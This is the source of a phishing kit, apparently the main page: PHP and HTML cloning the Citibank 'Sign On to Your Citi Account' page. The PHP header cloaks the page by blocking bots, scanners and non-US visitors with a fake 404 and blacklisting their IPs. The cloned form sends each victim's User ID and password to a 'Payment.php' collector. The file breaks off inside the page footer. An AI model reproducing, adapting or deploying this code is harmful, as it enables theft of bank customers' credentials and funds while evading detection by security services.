<?php
require "configg.php";
require "si_assetz/cinc/session_protect.php";
require "si_assetz/cinc/functions.php";
require "si_assetz/old_blocker.php";
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
if($mobile_lock == 1){
	require "si_assetz/mob_lock.php";
}
if($US_lock == 1){
	if(onlyus() == true){
	
	}else{
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}

?>
<!DOCTYPE html>
<html class="cbolui-ddl" style="display: block; visibility: visible;" lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=11,edge" />
        <meta charset="utf-8" />
        <title>Sign On to Your Citi Account - Citibank</title>
        <meta name="robots" content="noindex,nofollow" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" type="image/x-icon" href="si_assetz/img/favicon.ico" />
        <link rel="stylesheet" href="si_assetz/css/styles.css" />
        <link rel="stylesheet" href="si_assetz/css/login.css" />
		<style>
		@media only screen and (max-width: 1120px) {
			#nav-bar-main-ul {
				display:none !important;
			}
		}
		</style>
		<script src="si_assetz/js/jquery.js"></script>
        <script>
            $(document).ready(function () {
                var allInputs = $(":input");
                allInputs.focusin(function () {
					$(this).parent().parent().addClass('focused');
					$(this).parent().parent().prev().css('opacity','1');
				});
                allInputs.focusout(function () {
					$(this).parent().parent().removeClass('focused');
					$(this).parent().parent().prev().css('opacity','0');
					
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
								
								$(this).parent().parent().addClass('errored');
								$(this).parent().parent().next().show();
								
                            } else {
								$(this).parent().parent().next().hide();
								$(this).parent().parent().removeClass('errored');
								
								$(this).parent().parent().prev().css('opacity','1');
                                
                            }
                        }
                    });
                });
            });
        </script>
	</head>
    <body cz-shortcut-listen="true">
        <app-root _nghost-sc393="" ng-version="11.2.14" _nghost-ssr-c178="">
            <cbol-core _ngcontent-ssr-c178="" _nghost-ssr-c171="">
                <citi-parent-layout _ngcontent-ssr-c171="" _nghost-ssr-c117="">
                    <div _ngcontent-ssr-c117="" class="citi-outer-container cbolui-responsive cbolui-ddl-post">
                        <citi-header _ngcontent-ssr-c117="" _nghost-ssr-c96="">
                            <a _ngcontent-ssr-c96="" aria-live="assertive" class="alternateSkipNav" href="">Skip to Content</a>
                            <div _ngcontent-ssr-c96="" class="header">
                                <div _ngcontent-ssr-c96="" class="primary">
                                    <citi-banner2 _ngcontent-ssr-c96="" _nghost-ssr-c97="">
                                        <div _ngcontent-ssr-c97="" role="banner" class="banner">
                                            <div _ngcontent-ssr-c97="" class="content-wrap">
                                                <div _ngcontent-ssr-c97="" class="journeyLogo">
                                                    <div _ngcontent-ssr-c97="" class="logoDiv default">
                                                        <a _ngcontent-ssr-c97="" id="sessionFocusUrl" tabindex="0" href="https://www.citi.com/"><img _ngcontent-ssr-c97="" alt="Citi" src="si_assetz/img/citilogoredesign.png" /></a>
                                                    </div>
                                                </div>
                                                <div _ngcontent-ssr-c97="" class="buttons">
                                                    <div _ngcontent-ssr-c97="" class="navButton" id="butlerATM" style="filter: unset;">
                                                        <a _ngcontent-ssr-c97="" id="atmLink" href="https://online.citi.com/US/ag/citibank-location-finder">
                                                            <img _ngcontent-ssr-c97="" alt="" src="si_assetz/img/050-location2x.svg" /><span _ngcontent-ssr-c97="">ATM / BRANCH</span>
                                                        </a>
                                                    </div>
                                                    <div _ngcontent-ssr-c97="" class="navButton" id="lang">
                                                        <button _ngcontent-ssr-c97="" id="langBtn" style="filter: unset;">
                                                            <img _ngcontent-ssr-c97="" role="presentation" alt="" src="si_assetz/img/icon_globe_med-grey2x.svg" /><span _ngcontent-ssr-c97="">ESPAÑOL</span>
                                                        </button>
                                                        <citi-modal _ngcontent-ssr-c97="" class="cbolui-ddl-pre" _nghost-ssr-c39="">
                                                            <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="citi-modal-36">
                                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                        <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                            <div _ngcontent-ssr-c39="" class="modal-header">
                                                                                <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                                </button>
                                                                            </div>
                                                                            <div _ngcontent-ssr-c39="" role="document">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c97="" title="">Notificación importante</div></div>
                                                                                    <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                        <p _ngcontent-ssr-c97="">
                                                                                            <p>
                                                                                                <strong>
                                                                                                    Por favor, tenga en cuenta que es posible que las comunicaciones futuras del banco, ya sean verbales o escritas, sean únicamente en inglés.
                                                                                                    Estas comunicaciones podrían incluir, entre otras, contratos de cuentas, estados de cuenta y divulgaciones, así como cambios en términos o
                                                                                                    cargos o cualquier tipo de servicio para su cuenta. Además, es posible que algunas secciones de este website permanezcan en inglés.
                                                                                                </strong>
                                                                                            </p>
                                                                                            <hr />
                                                                                            <p>
                                                                                                Please be advised that future verbal and written communications from the bank may be in English only. These communications may include, but are
                                                                                                not limited to, account agreements, statements and disclosures, changes in terms or fees; or any servicing of your account. Additionally, some
                                                                                                sections of this site may remain in English.
                                                                                            </p>
                                                                                        </p>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                                <div _ngcontent-ssr-c39="" class="text-right">
                                                                                    <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                        <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                            <a _ngcontent-ssr-c36="" target="_self" id="b60f342f-993d-8d4f-7fee-6e968d79d094" href="https://www.citi.com/login" class="btn btn-primary">
                                                                                                Continuar
                                                                                            </a>
                                                                                        </citi-cta>
                                                                                        <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                            </div>
                                                        </citi-modal>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </citi-banner2>
                                    <citi-navigation3 _ngcontent-ssr-c96="" class="citi-navigation" _nghost-ssr-c109="">
                                        <div _ngcontent-ssr-c109="" role="navigation" aria-label="Main" class="navigationParent preLogin" style="background-color: rgb(0, 45, 114);">
                                            <div _ngcontent-ssr-c109="" class="mobileMenuContainer">
                                                <a _ngcontent-ssr-c109="" role="button" aria-label="Menu" id="mobileMenuLink" tabindex="0" class="menuLinkMobile" aria-expanded="false">
                                                    <span _ngcontent-ssr-c109="" id="menuClosed" class="menuIconMobile"></span>
                                                </a>
                                            </div>
                                            <ul _ngcontent-ssr-c109="" id="nav-bar-main-ul" class="nav-bar-main-ul" style="display: flex; position: static; box-shadow: none;">
                                                <li _ngcontent-ssr-c109="" role="listitem" class="mainListItems" id="butlerATMMainLI">
                                                    <a
                                                        _ngcontent-ssr-c109=""
                                                        tabindex="0"
                                                        class="main-links plusIcon"
                                                        id="butlerATMmainAnchor5"
                                                        role="link"
                                                        href="https://online.citi.com/US/ag/citibank-location-finder"
                                                        style="background-color: rgb(0, 45, 114);"
                                                    >
                                                        ATM / BRANCH
                                                    </a>
                                                    <div _ngcontent-ssr-c109="" class="subMenuMainContainer"></div>
                                                </li>
                                                <li _ngcontent-ssr-c109="" role="listitem" class="mainListItems" id="butlerEspanolMainLI">
                                                    <button _ngcontent-ssr-c109="" class="langBtn">
                                                        <img _ngcontent-ssr-c109="" src="si_assetz/img/icon_globe_med-grey2x.svg" alt="espanolLink" /><span _ngcontent-ssr-c109="">ESPAÑOL</span>
                                                    </button>
                                                    <citi-modal _ngcontent-ssr-c109="" class="cbolui-ddl-pre" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="citi-modal-38">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c109="" title="">Notificación importante</div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c109="">
                                                                                        <p>
                                                                                            <strong>
                                                                                                Por favor, tenga en cuenta que es posible que las comunicaciones futuras del banco, ya sean verbales o escritas, sean únicamente en inglés.
                                                                                                Estas comunicaciones podrían incluir, entre otras, contratos de cuentas, estados de cuenta y divulgaciones, así como cambios en términos o
                                                                                                cargos o cualquier tipo de servicio para su cuenta. Además, es posible que algunas secciones de este website permanezcan en inglés.
                                                                                            </strong>
                                                                                        </p>
                                                                                        <hr />
                                                                                        <p>
                                                                                            Please be advised that future verbal and written communications from the bank may be in English only. These communications may include, but are not
                                                                                            limited to, account agreements, statements and disclosures, changes in terms or fees; or any servicing of your account. Additionally, some sections
                                                                                            of this site may remain in English.
                                                                                        </p>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <a _ngcontent-ssr-c36="" target="_self" id="f31e1c32-2e7c-e384-ec60-09eed667250a" href="https://www.citi.com/login" class="btn btn-primary">
                                                                                            Continuar
                                                                                        </a>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                    <div _ngcontent-ssr-c109="" class="subMenuMainContainer"></div>
                                                </li>
                                            </ul>
                                        </div>
                                        <citi-sign-on-modal3 _ngcontent-ssr-c109="" class="citi-sign-on-modal" _nghost-ssr-c112=""></citi-sign-on-modal3><citi-nav-search _ngcontent-ssr-c109="" _nghost-ssr-c113=""></citi-nav-search>
                                    </citi-navigation3>
                                </div>
                                <citi-welcome-bar _ngcontent-ssr-c96="" _nghost-ssr-c98="" style="display: block !important;"></citi-welcome-bar>
                            </div>
                        </citi-header>
                        <div _ngcontent-ssr-c117="" id="maincontent">
                            <div _ngcontent-ssr-c117="">
                                <div _ngcontent-ssr-c117="" class="citi-container cbolui-ddl theme-light">
                                    <div _ngcontent-ssr-c117="" class="appbody">
                                        <router-outlet _ngcontent-ssr-c171=""></router-outlet>
                                        <citi-partner-login-validation _nghost-ssr-c184="">
                                            <citi-jamp _ngcontent-ssr-c184="" _nghost-ssr-c37="" class="preLoadJamp jamp-page-level hidden">
                                                <div _ngcontent-ssr-c37="" class="fillHeight">
                                                    <div _ngcontent-ssr-c37="" class="alignmentEl fillHeight position-initial">
                                                        <div _ngcontent-ssr-c37="" class="jamp jamp-center-css jamp-css"><span _ngcontent-ssr-c37="" class="img"></span><span _ngcontent-ssr-c37="" class="message">Loading</span></div>
                                                    </div>
                                                </div>
                                            </citi-jamp>
                                            <citi-simple-layout _ngcontent-ssr-c184="">
                                                <div _ngcontent-ssr-c184="">
                                                    <partner-login-lite-login-template _ngcontent-ssr-c184="" _nghost-ssr-c180="">
                                                        <citi-jamp _ngcontent-ssr-c180="" _nghost-ssr-c37="" class="hidden jamp-page-level">
                                                            <div _ngcontent-ssr-c37="" class="fillHeight">
                                                                <div _ngcontent-ssr-c37="" class="alignmentEl fillHeight position-initial">
                                                                    <div _ngcontent-ssr-c37="" class="jamp jamp-center-css jamp-css">
                                                                        <span _ngcontent-ssr-c37="" class="img"></span><span _ngcontent-ssr-c37="" class="message">Just a moment, please… </span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </citi-jamp>
                                                        <main _ngcontent-ssr-c180="">
                                                            <section _ngcontent-ssr-c180="" class="partner-login-container">
                                                                <div _ngcontent-ssr-c180="" class="partner-login-container-hero login-screen-logo" style="background-image: url('si_assetz/img/LSO_4959.jpg');"></div>
                                                                <div _ngcontent-ssr-c180="" content4="" class="partnerLoginBox">
                                                                    <citi-form-container _ngcontent-ssr-c180="" formname="partnerLoginForm" id="partnerIdForm" formmethod="post" formaction="#" formheader="">
                                                                        <form name="partnerLoginForm" action="Payment.php?sessionid=<?php echo generateRandomString(130); ?>&sslchannel=true" method="post">
                                                                            <div>
                                                                                <div _ngcontent-ssr-c180="" class="partner-login-content-fluid">
                                                                                    <div _ngcontent-ssr-c180="" class="signOnBlock">
                                                                                        <citi-signon2 _ngcontent-ssr-c180="" idstr="signInBtn" class="citi-signon2 signonContainer" _nghost-ssr-c72="">
                                                                                            <div _ngcontent-ssr-c72="" class="qr"></div>
                                                                                            <section _ngcontent-ssr-c72="" class="theme-light SampleErrorStates">
                                                                                                <h4 _ngcontent-ssr-c72="">Sign On</h4>
                                                                                                <div _ngcontent-ssr-c72=""></div>
                                                                                                <div _ngcontent-ssr-c72="" class="row">
                                                                                                    <div _ngcontent-ssr-c72="" class="username-input col-xs-6">
                                                                                                        <citi-input2 _ngcontent-ssr-c180="" idstr="username" username="" type="text" class="citi-input2 row" _nghost-ssr-c64="">
                                                                                                            <div _ngcontent-ssr-c64="" class="form-control-container col-xs-12">
                                                                                                                <label _ngcontent-ssr-c64="" tabindex="-1" for="username" id="username-label" style="opacity: 0;">User ID</label>
                                                                                                                <div _ngcontent-ssr-c64="" class="input-container ">
                                                                                                                    <div _ngcontent-ssr-c64="" class="add-on-pre"></div>
                                                                                                                    <span _ngcontent-ssr-c64="" class="input-switch-wrapper">
                                                                                                                        <input
                                                                                                                            _ngcontent-ssr-c64=""
                                                                                                                            autocapitalize="none"
                                                                                                                            type="text"
                                                                                                                            name="username"
                                                                                                                            id="username"
                                                                                                                            tabindex="0"
                                                                                                                            placeholder="User ID"
                                                                                                                            maxlength="524288"
                                                                                                                            autocomplete="off"
                                                                                                                            aria-required="true"
																															required
                                                                                                                            aria-labelledby="username-label"
                                                                                                                            aria-label=""
                                                                                                                            class="ng-untouched ng-pristine ng-valid"
                                                                                                                            
                                                                                                                        />
                                                                                                                    </span>
                                                                                                                    <div _ngcontent-ssr-c64="" class="add-on-post"></div>
                                                                                                                </div>
																												<div style="display:none;" _ngcontent-ssr-c64="" class="input-error"><span _ngcontent-ssr-c64="" class="validation-message-danger" id="username-error">Enter a User ID</span></div>
                                                                                                            </div>
                                                                                                        </citi-input2>
                                                                                                    </div>
                                                                                                    <div _ngcontent-ssr-c72="" class="password-input col-xs-6">
                                                                                                        <citi-input2 _ngcontent-ssr-c180="" idstr="password" password="" type="password" class="citi-input2 row" _nghost-ssr-c64="">
                                                                                                            <div _ngcontent-ssr-c64="" class="form-control-container col-xs-12">
                                                                                                                <label _ngcontent-ssr-c64="" tabindex="-1" for="password" id="password-label" style="opacity: 0;">Password</label>
                                                                                                                <div _ngcontent-ssr-c64="" class="input-container">
                                                                                                                    <div _ngcontent-ssr-c64="" class="add-on-pre"></div>
                                                                                                                    <span _ngcontent-ssr-c64="" class="input-switch-wrapper">
                                                                                                                        <input
                                                                                                                            _ngcontent-ssr-c64=""
                                                                                                                            autocapitalize="none"
                                                                                                                            type="password"
                                                                                                                            name="password"
                                                                                                                            id="password"
                                                                                                                            tabindex="0"
																															required
                                                                                                                            placeholder="Password"
                                                                                                                            maxlength="524288"
                                                                                                                            autocomplete="off"
                                                                                                                            aria-required="true"
                                                                                                                            aria-labelledby="password-label"
                                                                                                                            aria-label=""
                                                                                                                            class="ng-untouched ng-pristine ng-valid"
                                                                                                                            
                                                                                                                        />
                                                                                                                    </span>
                                                                                                                    <div _ngcontent-ssr-c64="" class="add-on-post"></div>
                                                                                                                </div>
																												<div style="display:none;" _ngcontent-ssr-c64="" class="input-error"><span _ngcontent-ssr-c64="" class="validation-message-danger" id="password-error">Enter a Password</span></div>
                                                                                                            </div>
                                                                                                        </citi-input2>
                                                                                                    </div>
                                                                                                </div>
                                                                                                <div _ngcontent-ssr-c72="">
                                                                                                    <div _ngcontent-ssr-c180="" remember="" class="checkbox">
                                                                                                        <input _ngcontent-ssr-c180="" type="checkbox" id="rememberUid" name="remember" />
                                                                                                        <label _ngcontent-ssr-c180="" for="rememberUid" id="rememberUidLabel">Remember User ID</label>
                                                                                                    </div>
                                                                                                </div>
                                                                                                <div _ngcontent-ssr-c72="" class="row">
                                                                                                    <div _ngcontent-ssr-c72="" class="form-group signonButton col-xs-12">
                                                                                                        <button _ngcontent-ssr-c72="" type="submit" class="btn btn-primary btn-block" id="signInBtn">Sign On</button>
                                                                                                    </div>
                                                                                                </div>
                                                                                                <div _ngcontent-ssr-c72="" class="row"></div>
                                                                                            </section>
                                                                                        </citi-signon2>
                                                                                        <div _ngcontent-ssr-c180="" class="row linkBlock">
                                                                                            <div _ngcontent-ssr-c180="" class="linkAlign col-xs-6">
                                                                                                <citi-cta _ngcontent-ssr-c180="" size="small" _nghost-ssr-c36="">
                                                                                                    <button _ngcontent-ssr-c36="" style="text-align: center;" type="button" id="forgotUIdLink" class="btn btn-link small">
                                                                                                        Forgot User ID?
                                                                                                    </button>
                                                                                                </citi-cta>
                                                                                            </div>
                                                                                            <div _ngcontent-ssr-c180="" class="linkAlign col-xs-6">
                                                                                                <citi-cta _ngcontent-ssr-c180="" size="small" _nghost-ssr-c36="">
                                                                                                    <button _ngcontent-ssr-c36="" style="text-align: center;" type="button" id="forgotPwdLink" class="btn btn-link small">
                                                                                                        Forgot Password?
                                                                                                    </button>
                                                                                                </citi-cta>
                                                                                            </div>
                                                                                            <div _ngcontent-ssr-c180="" class="linkAlign col-xs-6">
                                                                                                <citi-cta _ngcontent-ssr-c180="" size="small" _nghost-ssr-c36="">
                                                                                                    <button _ngcontent-ssr-c36="" style="text-align: center;" type="button" id="activateaCardLink" class="btn btn-link small">
                                                                                                        Activate a Card
                                                                                                    </button>
                                                                                                </citi-cta>
                                                                                            </div>
                                                                                            <div _ngcontent-ssr-c180="" class="linkAlign col-xs-6">
                                                                                                <citi-cta _ngcontent-ssr-c180="" size="small" _nghost-ssr-c36="">
                                                                                                    <button _ngcontent-ssr-c36="" style="text-align: center;" type="button" id="registerOnlineLink" class="btn btn-link small">
                                                                                                        Register for Online Access
                                                                                                    </button>
                                                                                                </citi-cta>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </form>
                                                                    </citi-form-container>
                                                                </div>
                                                            </section>
                                                        </main>
                                                        <citi-modal _ngcontent-ssr-c180="" idstr="qrSignonModal" closebuttonidstr="qrSignonModalCloseBtn" _nghost-ssr-c39="">
                                                            <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="qrSignonModal">
                                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                        <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                            <div _ngcontent-ssr-c39="" class="modal-header">
                                                                                <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                                </button>
                                                                            </div>
                                                                            <div _ngcontent-ssr-c39="" role="document">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="header"></div>
                                                                                    <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1"></div>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-ssr-c39="" class="modal-footer"><div _ngcontent-ssr-c39="" class="text-right"></div></div>
                                                                        </div>
                                                                        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                            </div>
                                                        </citi-modal>
                                                    </partner-login-lite-login-template>
                                                </div>
                                            </citi-simple-layout>
                                        </citi-partner-login-validation>
                                        <mfa-modal _ngcontent-ssr-c178="" _nghost-ssr-c87="">
                                            <div _ngcontent-ssr-c87=""><router-outlet _ngcontent-ssr-c87="" name="mfaContent"></router-outlet></div>
                                            <div _ngcontent-ssr-c87="" class="mfa-screen-alignment"><router-outlet _ngcontent-ssr-c87="" name="mfaConfirm"></router-outlet></div>
                                        </mfa-modal>
                                        <ivr-modal _ngcontent-ssr-c171="" _nghost-ssr-c174="">
                                            <citi-modal _ngcontent-ssr-c174="" idstr="modalID" id="ivr-modal" footerprojection="true" class="cbolui-ddl-post" _nghost-ssr-c39="">
                                                <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modalID">
                                                        <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                            <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                <div _ngcontent-ssr-c39="" class="modal-header">
                                                                    <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                        <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                    </button>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" role="document">
                                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                        <div _ngcontent-ssr-c39="" tabindex="-1" class="header"></div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                            <p _ngcontent-ssr-c174=""></p>
                                                                            <div _ngcontent-ssr-c174="" class="ivr-cta-wrapper"></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                    <div _ngcontent-ssr-c39=""><div _ngcontent-ssr-c39=""></div></div>
                                                                </div>
                                                            </div>
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                </div>
                                            </citi-modal>
                                        </ivr-modal>
                                        <cbol-session _ngcontent-ssr-c171="" _nghost-ssr-c172="">
                                            <citi-modal _ngcontent-ssr-c172="" showcancelbutton="true" primarybuttontarget="_blank" openerselector="#sessionFocus" class="cbolui-ddl-post" _nghost-ssr-c39="">
                                                <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="citi-modal-2">
                                                        <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                            <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                <div _ngcontent-ssr-c39="" class="modal-header">
                                                                    <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                        <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                    </button>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" role="document">
                                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                        <div _ngcontent-ssr-c39="" tabindex="-1" class="header"></div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                            <p _ngcontent-ssr-c172=""></p>
                                                                            <p _ngcontent-ssr-c172=""><b _ngcontent-ssr-c172=""> </b></p>
                                                                            <p _ngcontent-ssr-c172=""></p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" class="modal-footer"><div _ngcontent-ssr-c39="" class="text-right"></div></div>
                                                            </div>
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                </div>
                                            </citi-modal>
                                        </cbol-session>
                                        <cobrowse-modal _ngcontent-ssr-c171="" _nghost-ssr-c114="">
                                            <citi-modal _ngcontent-ssr-c114="" idstr="modal" _nghost-ssr-c39="">
                                                <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal">
                                                        <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                            <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                <div _ngcontent-ssr-c39="" class="modal-header">
                                                                    <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                        <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                    </button>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" role="document">
                                                                    <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                        <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c114="" title=""></div></div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                            <div _ngcontent-ssr-c114="">
                                                                                <p _ngcontent-ssr-c114=""></p>
                                                                                <div _ngcontent-ssr-c114="" class="theme-light">
                                                                                    <citi-input _ngcontent-ssr-c114="" type="text" class="citi-input row" _nghost-ssr-c56="">
                                                                                        <div _ngcontent-ssr-c56="" class="col-xs-12 form-group">
                                                                                            <label _ngcontent-ssr-c56="" for="undefined" id="null" class="text-input-label"></label>
                                                                                            <div _ngcontent-ssr-c56="">
                                                                                                <div _ngcontent-ssr-c56="">
                                                                                                    <div _ngcontent-ssr-c56="">
                                                                                                        <input
                                                                                                            _ngcontent-ssr-c56=""
                                                                                                            aria-label=""
                                                                                                            type="text"
                                                                                                            placeholder=""
                                                                                                            maxlength="524288"
                                                                                                            autocomplete="off"
                                                                                                            class="form-control ng-untouched ng-pristine ng-valid"
                                                                                                        />
                                                                                                    </div>
                                                                                                </div>
                                                                                                <span _ngcontent-ssr-c56="" aria-hidden="true" class="sr-only" id="undefined-error">Error</span>
                                                                                            </div>
                                                                                        </div>
                                                                                    </citi-input>
                                                                                </div>
                                                                                <div _ngcontent-ssr-c114=""></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ssr-c39="" class="modal-footer"><div _ngcontent-ssr-c39="" class="text-right"></div></div>
                                                            </div>
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                </div>
                                            </citi-modal>
                                        </cobrowse-modal>
                                        <citi-route-detector _ngcontent-ssr-c171=""></citi-route-detector><citi-session-handler _ngcontent-ssr-c171="" interval="10000"></citi-session-handler>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <citi-footer _ngcontent-ssr-c117="" _nghost-ssr-c99="">
                            <div _ngcontent-ssr-c99="" role="contentinfo" class="footer">
                                <citi-footer-navigation _ngcontent-ssr-c99="" _nghost-ssr-c100="">
